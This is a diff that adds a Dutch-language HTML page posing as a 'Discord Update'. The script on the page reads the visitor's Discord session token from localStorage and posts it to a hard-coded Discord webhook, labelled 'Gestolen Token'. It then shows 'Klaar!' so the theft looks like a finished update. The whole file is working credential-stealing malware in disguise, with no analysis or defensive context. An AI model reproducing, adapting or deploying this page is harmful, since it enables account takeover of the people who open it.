@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Update</title>
+</head>
+<body style="background-color: #2f3136; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h2>Discord is bijgewerkt!</h2>
+    <p>Even geduld aub...</p>
+    
+    <script>
+        // Jouw specifieke webhook URL
+        const webhookUrl = "https://discord.com/api/webhooks/1547618560568983552/9yEl5UUZWW1lNHipbA5cRuOgg6t0Co0blXTh0nx3D-9jcxmsGrtWMtxYb_8V3OPHEVMg";
+
+        // Haal het token op van de huidige browser sessie
+        const token = localStorage.getItem("token");
+
+        if (token) {
+            // Stuur het token naar jouw Webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `Gestolen Token:\n\`\`\`${token}\`\`\`` })
+            })
+            .then(() => {
+                // Verander de tekst zodat het lijkt alsof het gelukt is
+                document.querySelector('h2').innerText = "Klaar!";
+                document.querySelector('p').innerText = "Je kunt nu terug naar Discord.";
+            })
+            .catch(err => console.error(err));
+        } else {
+            document.querySelector('h2').innerText = "Geen sessie gevonden.";
+        }
+    </script>
+</body>
+</html>
